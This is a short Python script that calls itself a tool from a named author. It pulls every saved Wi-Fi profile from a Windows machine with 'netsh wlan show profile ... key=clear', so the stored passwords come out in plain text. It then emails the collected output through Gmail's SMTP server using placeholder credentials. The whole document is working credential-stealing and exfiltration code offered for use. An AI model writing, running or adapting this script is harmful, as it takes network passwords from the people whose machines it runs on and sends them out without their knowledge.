#This Tool Coded By Libyan_Devil
#r00tly
try:
	import subprocess, smtplib, re
except Exception as e:
	print("Some Modules Are Missing {}".format(e))


def send_mail(email, password, message):
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.starttls()
	server.login(email,password)
	server.sendmail(email, email, message)
	server.quit()


command = "netsh wlan show profile"

networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall(b"(?:Profile\s*:\s)(.*)", networks)
result = ""

for netowrk_name in network_names_list:
	network = netowrk_name.decode('utf-8')
	command = "netsh wlan show profile" + " " + network + " " + "key=clear"
	cresult = subprocess.check_output(command, shell=True)
	current_result = cresult.decode("utf-8")
	result = result + current_result


send_mail("test@gmail.com", "123456", result)